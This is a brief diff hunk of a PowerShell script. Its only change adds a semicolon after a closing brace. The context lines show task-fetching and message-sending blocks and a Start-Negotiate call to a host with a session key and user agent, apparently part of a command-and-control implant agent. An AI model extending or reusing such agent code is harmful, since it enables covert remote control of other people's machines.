@@ -31,7 +31,7 @@ $Script:GetTask = {
             Start-Negotiate -S "$Script:host" -SK $SK -UA $ua;
         }
     }
-}
+};
 
 $Script:SendMessage = {
     param ($data)
